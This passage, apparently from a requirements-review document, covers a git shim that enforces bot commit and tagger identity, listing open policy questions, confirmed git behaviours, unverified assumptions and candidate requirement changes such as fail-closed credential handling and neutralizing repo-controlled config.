  Recommendation is fail closed (B19, B24). Needs an FR.
- Repo-controlled git config (`.git/config`) that redirects identity, SSH, credentials, hooks,
  or `insteadOf`: how far does the shim neutralize it, given it is distinct from the shim's own
  trusted per-repo config (D7, D8, D9, D18)? Needs a policy.
- Equal-specificity identity tie (D17): P2 gives no tie-breaker. Recommendation is refuse and
  name both. Needs an FR.
- Plumbing and non-`git commit` commit creators (stash, notes, `commit-tree`, `filter-branch`,
  `filter-repo`, `git replace`): in scope or out (A27, A28, A32 to A35, A39)? The
  author-preservation mechanism is now resolved (sentinel plus the carrying-remove rule); the
  remaining question is the scope boundary for each command.
- Confirmed during review (no longer open): `hasconfig` scans `remote.*.url` only, not
  `pushurl`, so the shim must add `pushurl` to its own match set; cherry-pick preserves the
  original author (via git-commit `--reset-author`); arguments after `--`/`--end-of-options` are
  pathspecs, so option classification stops there; committer-identity environment variables
  drive annotated-tag date and signing (the tagger name/email mapping remains inferred).
- Still `[UNVERIFIED]`, to pin empirically before a requirement relies on them: stash commit
  authorship; the literal `GIT_COMMITTER_NAME`/`EMAIL` to tagger-line mapping; git-lfs honoring
  `GIT_SSH_COMMAND` on Windows; and whether `cherry-pick -n`/`revert -n` leave sequencer refs (a
  wrong-by-default identity risk if the shim assumes the ref is present).

## Candidate Requirement Changes (preliminary, for the FR phase)

Additions to consider: tagger identity for annotated and signed tags; caller-set identity
precedence as a three-action rule (originating overwrites `GIT_AUTHOR_*` and `GIT_COMMITTER_*`
with the bot; carrying removes the caller `GIT_AUTHOR_*` so git restores the original author;
the committer is always forced to the bot) together with a sentinel marking shim-created child
environments so git-internal re-authoring is told apart from a hostile caller; real-git
resolution and nested-invocation and self-recursion safety; non-matched-host write refusal in
bot mode; missing-credential fail-closed behavior; equal-specificity tie refusal; neutralizing
repo-controlled and caller-redirected git config that selects identity or credentials;
secret-leak guards for trace and header channels; a scope decision for stash, notes,
`commit-tree`, and `filter-branch`; and a non-goal note for the hosting-API account and
`git filter-repo`.

Refinements to consider: P1 to state the repository-versus-contacted-host split; FR-031 to add
the `am` in-progress sequencer state and the explicit no-`GIT_AUTHOR_*` rule for the plumbing
path; the write taxonomy (FR-011) to name tag, notes, and stash explicitly.
